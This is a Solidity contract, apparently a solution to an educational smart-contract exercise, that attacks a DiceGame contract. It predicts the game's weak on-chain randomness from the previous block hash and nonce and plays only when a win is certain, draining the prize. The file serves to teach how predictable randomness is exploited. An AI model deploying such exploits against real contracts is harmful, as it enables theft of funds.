pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    event FundsDeposited(address indexed depositor, uint256 amount);
    event RiggedRollResult(bool isWin, uint256 roll);
    
    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress); // Get the address of the DiceGame contract
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable _addr, uint256 _amount) public onlyOwner {
        require(_amount <= address(this).balance, "Insufficient balance");
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public onlyOwner {
        require(address(this).balance >= 0.002 ether, "Not enough balance to roll");

        // Generate a pseudo-random number for the dice roll
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);  // Get the hash of the previous block
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));  // Create a unique hash
        uint256 roll = uint256(hash) % 16;  // Convert hash to a number between 0 and 15

        // console.log("\t", "   Previous Block Hash:", uint256(prevHash)); // To write the RiggedRoll attack contract, we need to know the previous block hash
        // console.log("\t", "   Nonce:", nonce);  // and the rest of the variables that are hashed together
        // console.log("\t", "   Contract Address:", address(diceGame));
        // console.log("\t", "   Dice Game Roll:", roll);

        if (roll < 6) {
            console.log("\t", "   Predicted win, calling rollTheDice()");
            diceGame.rollTheDice{value: 0.002 ether}();
            emit RiggedRollResult(true, roll);
        } else {
            console.log("\t", "   Predicted loss, not calling rollTheDice()");
            emit RiggedRollResult(false, roll);
            revert("Predicted roll > 5, not calling rollTheDice()");
        }
    }

    function depositEther() public payable {
        // You can add custom logic here if needed
        // For example, you might want to emit an event or perform some checks
        emit FundsDeposited(msg.sender, msg.value);
    }

    // Check this contract's balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {
        // This function allows the contract to receive Ether when no data is sent with the transaction
        // It's useful for accepting payments or deposits without calling a specific function
    }
}
